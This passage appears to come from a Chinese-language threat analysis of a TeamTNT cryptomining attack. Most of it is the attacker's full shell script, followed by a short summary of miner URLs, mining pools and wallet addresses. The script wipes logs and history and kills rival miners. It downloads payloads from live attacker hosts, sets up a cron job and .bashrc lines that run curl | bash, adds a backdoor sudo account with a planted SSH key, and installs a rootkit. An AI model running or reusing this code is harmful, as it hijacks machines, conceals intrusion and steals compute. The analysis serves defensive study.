VJIGdlZnVuZGVuIChsb2VzY2hlKVwwMzNbMG0iIApEQVRFSV9FTlRGRVJORU4gJFBSRUxPQURfREFURUkKZWxzZSAKZWNobyAtZSAiXDAzM1swOzMybSAkUFJFTE9BRF9EQVRFSSBuaWNodCBnZWZ1bmRlbi5cMDMzWzBtIiA7IGZpCmRvbmUKZmkKREFURUlfRU5URkVSTkVOIC9ldGMvbGQuc28ucHJlbG9hZAoKZWxzZSAKZWNobyAtZSAiXDAzM1swOzMybSAvZXRjL2xkLnNvLnByZWxvYWQgbmljaHQgZ2VmdW5kZW4uXDAzM1swbSIKZmkKCgp1bnNldCBMRF9QUkVMT0FEIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCnVuc2V0IExEX0xJQlJBUllfUEFUSCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbAp1bnNldCBMRFJfUFJFTE9BRCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbAp1bnNldCBMRFJfUFJFTE9BRDY0IDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCgpybSAtZiB+Ly5iYXNoX2hpc3RvcnkgMj4vZGV2L251bGwgMT4vZGV2L251bGwKdG91Y2ggfi8uYmFzaF9oaXN0b3J5IDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCnRudGNodCAraSB+Ly5iYXNoX2hpc3RvcnkgMj4vZGV2L251bGwgMT4vZGV2L251bGwKaGlzdG9yeSAtYyAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbApjbGVhcgppZiBbWyAiJDAiICE9ICJiYXNoIiBdXTsgdGhlbiBybSAtZiAkMDsgZmk= |base64 -d |bash 2>/dev/null 1>/dev/null    
    ${TNT_CMD} -ia /etc/hosts 2>/dev/null
    sed -i '/minexmr.com\|supportxmr.com\|c3pool.com/d' /etc/hosts 2>/dev/null
    grep -q 8.8.8.8 /etc/resolv.conf || (${TNT_CMD} -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.8.8" >> /etc/resolv.conf; ${CHATTR} +i /etc/resolv.conf 2>/dev/null 1>/dev/null;)
    grep -q 8.8.4.4 /etc/resolv.conf || (${TNT_CMD} -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.4.4" >> /etc/resolv.conf; ${CHATTR} +i /etc/resolv.conf 2>/dev/null 1>/dev/null;)

    h=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)
    for i in /tmp /var/tmp /dev/shm /usr/bin $h /root /;do
        echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break
    done 
    crontab -l | sed '/\.bashgo\|pastebin\|onion\|bprofr/d' | crontab -
    cat /proc/mounts | awk '{print $2}' | grep -P '/proc/\d+' | grep -Po '\d+' | xargs -I % kill -9 %
}
function CLEANUP_TEAMTNT_TRACES() {

    rm -fr /dev/shm/dia/ 2>/dev/null 1>/dev/null
    rm -f ~/.bash_history 2>/dev/null 1>/dev/null
    touch ~/.bash_history 2>/dev/null 1>/dev/null
    history -c 2>/dev/null 1>/dev/null
    ${TNT_CMD} +i ~/.bash_history 2>/dev/null 1>/dev/null
    clear
    if [[ "$0" != "bash" ]]; then rm -f $0; fi

    cat /dev/null >/var/spool/mail/root 2>/dev/null
    cat /dev/null >/var/log/wtmp 2>/dev/null
    cat /dev/null >/var/log/secure 2>/dev/null
    cat /dev/null >/var/log/cron 2>/dev/null
}

function CLEANUP_OTHER_MINERS() {
chmod -x /usr/bin/dockerd_env 2>/dev/null
kill $(ps aux | grep -v grep | awk '{if($3>65.0) print $2}') 2>/dev/null

}

MOxmrigMOD=http://112.253.11.38/mid.jpg
MOxmrigSTOCK=http://112.253.11.38/mid.jpg
miner_url=https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-static-x64.tar.gz
miner_url_backup=http://oracle.zzhreceive.top/b2f628/father.jpg
config_url=http://oracle.zzhreceive.top/b2f628/cf.jpg
config_url_backup=http://oracle.zzhreceive.top/b2f628/cf.jpg
sh_url=http://oracle.zzhreceive.top/b2f628/cf.jpg
WALLET=43Xbgtym2GZWBk87XiYbCpTKGPBTxYZZWi44SWrkqqvzPZV6Pfmjv3UHR6FDwvPgePJyv9N5PepeajfmKp1X71EW7jx4Tpz.zookp8
VERSION=2.9

function TEAMTNT_DLOAD() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do 
      [[ "$line" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}

CLEANUP_BY_TEAMTNT
CLEANUP_OTHER_MINERS

mount -o remount,exec /tmp
mount -o remount,exec /var/tmp

sh_url="http://104.192.82.138/s3f1015" 

clean_cron(){  
    ${CHATTR} -R -ia /var/spool/cron 
    ${CHATTR} -ia /etc/crontab 
    ${CHATTR} -R -ia /etc/cron.d 
    ${CHATTR} -R -ia /var/spool/cron/crontabs 
    crontab -r
    (
        crontab -l 2>/dev/null
        echo "*/30 * * * * ${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash > /dev/null 2>&1"
    ) | crontab - 
}  
clean_cron 
lock_cron(){ 
    ${CHATTR} -R +ia /var/spool/cron 
    touch /etc/crontab
    ${CHATTR} +ia /etc/crontab 
    ${CHATTR} -R +ia /var/spool/cron/crontabs 
    ${CHATTR} -R +ia /etc/cron.d 
} 
lock_cron 
makesshaxx(){  
    RSAKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD0niuqhmdgATEUH9gaaxhnK9x8y9GopY1MxQe1VGWSps/MGb/ngvEu9DMVrnH/RcsnnPsV1Ncyjd/y4CdvFrR+OoNZquuVfAUbhOUO6up6GxtoObSV3V5lyepnJK5gzmxfelfmotxUzzwMYkgdsdeasVS4pqdASrivsFdG8kf59XG6VAD5j14uojZnLzVwvDs5usHFyS9QRr4pEfd670bO0TAbSQjf76eVwgQTMoQJaK1uHDkeVPuHhLXZtGPF2NVr1fTB3L8udxfQvw1A0OSLoKtYEXrDbiDKrJ+QINLvn8i98k2d+/EvDtM+BpuH8FTw3rC9VuY/IutOo0aY0mRXMn5A1L0x2YCfSavUH+zwf3qPLUW4rQNYxXoX5xzYafLsuYjfvhwYkO4OZb3teOU7vcFcYc1cgthdOtDfllMXmdOJKhMlwVB2xBx3UJyZQdqdOnFTxQ8i1j2li0ywKiARDFypqj+GNSBwpTKhYsWW699oSI79JD9r4tWfxyVyfAs= root@pending.com"
    ${CHATTR} -ia /etc/passwd;  
    grep -q lsb /etc/passwd || echo 'lsb:x:1000:1000::/home/lsb:/bin/bash' >> /etc/passwd
    ${CHATTR} +ia /etc/passwd
    ${CHATTR} -ia /etc/shadow
    grep -q "lsb:$6$4E4W/nnk" /etc/shadow  || echo 'lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::' >> /etc/shadow
    ${CHATTR} +ia /etc/shadow
    ${CHATTR} -ia /etc/sudoers  
    grep -q lsb /etc/sudoers || echo 'lsb ALL=(ALL:ALL) ALL' >> /etc/sudoers
    ${CHATTR} +i /etc/sudoers

    mkdir /home/lsb/.ssh/ -p  
    ${CHATTR} -ia /home/lsb/.ssh/authorized_keys
    touch /home/lsb/.ssh/authorized_keys  
    chmod 600 /home/lsb/.ssh/authorized_keys
    grep -q root@pending.com /home/lsb/.ssh/authorized_keys || echo $RSAKEY > /home/lsb/.ssh/authorized_keys
    ${CHATTR}  +ia /home/lsb/.ssh/authorized_keys

    ${CHATTR} -ia /home/lsb/.ssh/authorized_keys2
    touch /home/lsb/.ssh/authorized_keys2  
    chmod 600 /home/lsb/.ssh/authorized_keys2  
    grep -q root@pending.com /home/lsb/.ssh/authorized_keys2 || echo $RSAKEY > /home/lsb/.ssh/authorized_keys2
    ${CHATTR} +ia /home/lsb/.ssh/authorized_keys2

    mkdir /root/.ssh/ -p  
    ${CHATTR} -ia /root/.ssh/authorized_keys
    touch /root/.ssh/authorized_keys  
    chmod 600 /root/.ssh/authorized_keys 
    grep -q root@pending.com /root/.ssh/authorized_keys || echo $RSAKEY >> /root/.ssh/authorized_keys

    ${CHATTR} +ia /root/.ssh/authorized_keys

    ${CHATTR} -ia /root/.ssh/authorized_keys2
    touch /root/.ssh/authorized_keys2
    chmod 600 /root/.ssh/authorized_keys2   
    grep -q root@pending.com /root/.ssh/authorized_keys2 || echo $RSAKEY > /root/.ssh/authorized_keys2
    ${CHATTR} +ia /root/.ssh/authorized_keys2
    for f in $(ls /home)
    do 
        if ! grep "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" /home/${f}/.profile > /dev/null;then
            echo "{" >> /home/${f}/.profile
            echo "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" >> /home/${f}/.profile
            echo "} > /dev/null 2>&1" >> /home/${f}/.profile
        fi  
        if ! grep "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" /home/${f}/.bashrc > /dev/null;then
            echo "{" >> /home/${f}/.bashrc
            echo "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" >> /home/${f}/.bashrc
            echo "} > /dev/null 2>&1" >> /home/${f}/.bashrc
        fi  
    done 

    if ! grep "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" /root/.profile > /dev/null;then
        echo "{" >> /root/.profile
        echo "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" >>/root/.profile
        echo "} > /dev/null 2>&1" >> /root/.profile
    fi  
    if ! grep "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" /root/.bashrc > /dev/null;then
        echo "{" >> /root/.bashrc
        echo "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" >>/root/.bashrc
        echo "} > /dev/null 2>&1" >> /root/.bashrc
    fi 
}
makesshaxx

export MOHOME="/var/tmp/..."
mkdir -p ${MOHOME}  
${WGET_CMD}  -q --tries=3 --timeout=10 -O ${MOHOME}/httpd-w ${sh_url}/s/w.0.tar.gz
chmod a+x ${MOHOME}/httpd-w
cd ${MOHOME}  

./httpd-w 2>/dev/null 1>/dev/null  

${CURL_CMD} -sLk ${sh_url}/sh/dia.sh | bash
echo "[*] Diamorphine Setup complete"
history -c
sleep 1
clear

```

总结
--

挖矿主程序

<https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-static-x64.tar.gz>

挖矿备用程序

<http://oracle.zzhreceive.top/b2f628/father.jpg>

本文矿池地址：

xmr.f2pool.com:13531

xmr-asia1.nanopool.org:14444

钱包地址：

43Xbgtym2GZWBk87XiYbCpTKGPBTxYZZWi44SWrkqqvzPZV6Pfmjv3UHR6FDwvPgePJyv9N5PepeajfmKp1X71EW7jx4Tpz

89sp1qMoognSAbJTprreTXXUv9RG1AJBRjZ3CFg4rn6afQ5hRuqxiWRivYNqZbnYKKdsH5pCiTffrZToSyzXRfMvSHx5Guq

关于挖矿流程：

<https://github.com/Miner1305/xmrig-proxy/blob/bae9edcf350b5e036642915ac632fe420db74a26/doc/STRATUM.md>

关于运行docker来挖矿可以参考腾讯云鼎实验室文章，下面再贴上连接：

<https://cloud.tencent.com/developer/article/1890593>